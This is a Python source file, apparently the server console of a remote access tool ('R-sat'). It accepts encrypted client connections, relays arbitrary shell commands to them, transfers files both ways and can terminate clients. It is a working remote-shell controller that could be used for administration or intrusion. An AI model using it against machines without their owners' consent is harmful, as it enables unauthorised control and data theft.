import threading
import termcolor
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import socket
from Client_mod import Client
from master_mod import master_dashboard
from file_upload_download import FileManagerServerside as FileManagerClient
from ecc_implement import ECDH
import logging

logging.basicConfig(filename="Server.log",
                    format='%(asctime)s %(message)s',
                    filemode='w')

logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Variable
lock = threading.Lock()
listen_clients = 5
clients = []
server_id = 0

def show_stats(cpu_percent, V_ram, dsk_usage, duration=5):
    console = Console()
    start_time = time.time()

    def create_table(cpu, memory, disk):
        table = Table(title="System Stats")
        table.add_column("Metric", justify="left", style="cyan", no_wrap=True)
        table.add_column("Value", justify="right", style="magenta")
        table.add_row("CPU Usage", f"{cpu}%")
        table.add_row("Memory Usage", f"{memory}%")
        table.add_row("Disk Usage", f"{disk}%")
        return table
    
    with Live(console=console, refresh_per_second=1) as live:
        while time.time() - start_time < duration:
            live.update(create_table(cpu_percent, V_ram, dsk_usage))
            time.sleep(1)

#socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = socket.gethostbyname(socket.gethostname())
PORT = 6969
s.bind((HOST, PORT))
s.listen(listen_clients)
logger.info("server started and listening...")
print(termcolor.colored("Server started and listening...", "green"))

#methods

def color(text, col):
    return termcolor.colored(text, col)

def handle_clients():
    global clients
    counter = 0
    while True:
        conn, addr = s.accept()        
        key_gen = conn.recv(1024).decode().split("-")
        server_EC = ECDH()
        conn.send(f"{server_EC.public_key.x}-{server_EC.public_key.y}".encode())
        key = server_EC.generate_secret(int(key_gen[0]), int(key_gen[1]))
        key = str(key).encode()[:16]
        new_client = Client(key, conn, True, addr)
        try:
            new_client.os = new_client.recv()
        except:
            new_client.os = "Unidentifed!!!"
        with lock:
            counter += 1
            new_client.set_id(counter)
            clients.append(new_client)
            logger.info(f"new client -> {new_client.addr}-\"{new_client.os}\" is connected!")
            print(color(f"Connected to {new_client.addr}", "green"), "secret=",new_client.key)

threading.Thread(target=handle_clients, daemon=True).start()

def check_client(client: Client):
    try:
        client.send("..SYN..")
        client.recv()  
    except socket.error:
        logger.info(f"client-> ({client.addr}) is down!")
        client.mark_offline()
    
def show_clients():
    with lock:
        print(color("Connected clients:", "cyan"))
        for i, client in enumerate(clients):
            check_client(client)
            print(f"[{i+1}] {color(client.addr, "blue")}"+f"-> client-id: {client.id}"+ f" Active {color("*", "green")}" if client.status else f"[{i+1}] {color(client.addr, "red")}"+f"-> client-id: {client.id}" + f" unActive {color("*", "red")}")

def dashboard():
    global clients
    print(color("You are entered in master mode\n", "green"), color("Type help to Know about the commands..", "blue"))
    while True:
        from_user = input(f"{color("Master~@R-sat-> ", "yellow")}")
        if from_user.lower() == "help":
            print('''(1) Use "clients" to show clients and there status.
(2) use "rm <server:id>" to remove the server from dashboard.
(3) Use "clear_all" to to delete all clients.
(4) use "exit" to back on main mode. 
                ''')
        elif from_user == "clients":
            show_clients()
        elif from_user.startswith("rm"):
            try:
                id = int(from_user.split("rm ")[1])
                print(f"selected client {id}")
            except Exception as e:
                print("some exception occured", e)
                continue
            if id < 0:
                print("Not a valid client")
                continue
            else:
                for i, client in enumerate(clients):
                    if client.id == id:
                        if client.status:
                            print(color("You are deleting an active client enter (y) to continue", "red"))
                            confirmation = input()
                            if confirmation.lower() == "y":
                                client.send("####TERMINATE####")
                                clients.pop(i)
                        else:
                            print(f"deleting client_id = {client.id} from server")
                            clients.pop(i)


        elif from_user == "clear_all":
            print(color("Warning!! deleting all clients press (y) to continue, press (n) to terminate command(default)", "red"))
            confirmation = input()
            if confirmation.lower() == "y":
                for client in clients:
                    check_client(client)
                    if client.status:
                        client.send("####TERMINATE####")
                clients.clear()
        elif from_user.lower() == "exit":
            break
        else:
            print(color("Command Not Recognized!", "red"))
                    

while True:
    if clients:
        try:
            client_now = clients[server_id]
        except (ValueError, IndexError) as e:
            print(termcolor.colored(f"Some Error Happened: {e}", "red"))
            server_id = 0
            continue

        prompt = input(f"[{color("*", "blue")}] {color("shell", "green")}~{client_now.addr} ")


        if prompt.lower().startswith("switch"):
            try:
                server_id = int(prompt.split()[1]) - 1
            except:
                server_id = 0
                continue

        elif prompt.lower() == "clients":
            show_clients()
        elif prompt.lower() == "master":
            for clts in clients:
                check_client(clts)
            master_dashboard(clients)
        elif prompt.startswith("upload "):
            filepath = prompt.split("upload ")[1]
            check_client(client_now)
            ff = FileManagerClient(client_now)
            file_stat = ff.file_upload(filepath)
            print(file_stat)
        elif prompt.startswith("download "):
            filename = prompt.split("download ")[1]
            check_client(client_now)
            ff = FileManagerClient(client_now)
            file_stat = ff.download(filename)
            print(file_stat)

        elif prompt == "dashboard":
            dashboard()


        else:
            if client_now.status:
                try:
                    client_now.send(prompt)
                    from_client = client_now.recv()
                    if from_client.startswith("####CPUM#### "):
                        stats = from_client.split("####CPUM#### ")[1].split("-")
                        show_stats(stats[0], stats[1], stats[2])
                    else:
                        print(from_client)
                except:
                    print(color("The Client may be offline.... ", "red"))
                    print(color("try switching to active servers", "green"))
                    check_client(client_now)
                    show_clients()
                    continue
            else:
                print(color("You Can't send command to offline server....", "red"))
                print(color("switch to active servers", "green"))
                show_clients()

        check_client(client_now)
